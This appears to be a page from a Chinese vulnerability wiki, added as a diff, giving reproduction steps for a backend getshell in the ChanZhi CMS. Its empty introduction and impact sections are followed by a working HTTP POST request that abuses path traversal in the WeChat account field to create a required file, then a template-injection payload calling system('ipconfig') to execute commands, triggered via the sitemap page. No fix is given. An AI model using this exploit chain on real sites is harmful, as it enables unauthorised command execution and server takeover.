@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%A6%85%E7%9F%A5/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>禅知 后台getshell - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u7985\u77e5 \u540e\u53f0getshell", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93%2011.6%20api-getModel-api-getMethod-filePath%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93%2011.6%20api-getModel-api-getMethod-filePath%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%A6%85%E7%9F%A5Pro%201.6%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%A6%85%E7%9F%A5Pro%201.6%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        禅知 Pro 1.6 前台任意文件读取
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="getshell">禅知 后台getshell<a class="headerlink" href="#getshell" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>后台存在模板编辑，但是如果保存的话需要创建一个/system\tmp\xjrg.txt文件，那么我们找到一个可以创建任意文件的地方就</p>
+<p><img alt="" src="../resource/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell/media/rId24.png" /></p>
+<p>在/system/module/wechat/model.php</p>
+<p><img alt="" src="../resource/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell/media/rId25.png" /></p>
+<p>$qrcodeFile未过滤目录穿越导致可以去其他地方创建文件夹通过微信设置原始ID的地方写入穿越的文件路径</p>
+<p><img alt="" src="../resource/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell/media/rId26.png" /></p>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/chanzhieps/www/admin.php?m=wechat&amp;f=edit&amp;publicID=1</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">0-sec.org</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">application/json, text/javascript, */*; q=0.01</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">DNT</span><span class="o">:</span> <span class="l">1</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded; charset=UTF-8</span>
+<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://localhost/chanzhieps/www/admin.php?m=wechat&amp;f=edit&amp;publicID=1</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">120</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">adminsid=ae8tu3s80j8cfvh2hkgu41bbig; adminLang=zh-cn; adminDevice=desktop; theme=default; currentGroup=setting; frontsid=eaa0tdicbqfq0lurm89t3n9fvn; frontLang=zh-cn; frontDevice=desktop</span>
+<span class="na">X-Forwarded-For</span><span class="o">:</span> <span class="l">8.8.8.8</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+
+<span class="nt">type</span><span class="o">=</span><span class="s">subscribe</span><span class="p">&amp;</span><span class="nt">name</span><span class="o">=</span><span class="s">123</span><span class="p">&amp;</span><span class="nt">account</span><span class="o">=</span><span class="s">..%2F..%2F..%2Fsystem%5Ctmp%5Cxjrg.txt%5C1</span><span class="p">&amp;</span><span class="nt">appID</span><span class="o">=</span><span class="s">789</span><span class="p">&amp;</span><span class="nt">appSecret</span><span class="o">=</span><span class="s">100</span><span class="p">&amp;</span><span class="nt">token</span><span class="o">=</span><span class="s">222</span><span class="p">&amp;</span><span class="nt">certified</span><span class="o">=</span><span class="s">0</span>
+</code></pre></div>
+
+<p>点一下二维码，再随便传一张图片，可以看到创建了一个xjrg.txt文件夹</p>
+<p><img alt="" src="../resource/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell/media/rId27.png" /></p>
+<p>现在我们再去编辑模板，{!echo(system(\'ipconfig\'))},可以直接写入一句话</p>
+<p><img alt="" src="../resource/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell/media/rId28.png" /></p>
+<p>然后在访问前台</p>
+<p>http:/0-sec.org/chanzhieps/www/index.php/sitemap/</p>
+<p><img alt="" src="../resource/%E7%A6%85%E7%9F%A5%E5%90%8E%E5%8F%B0getshell/media/rId29.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93%2011.6%20api-getModel-api-getMethod-filePath%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93%2011.6%20api-getModel-api-getMethod-filePath%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        禅道 11.6 api-getModel-api-getMethod-filePath 任意文件读取漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%A6%85%E7%9F%A5Pro%201.6%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%A6%85%E7%9F%A5Pro%201.6%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="btn btn-xs btn-link">
+        禅知 Pro 1.6 前台任意文件读取
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
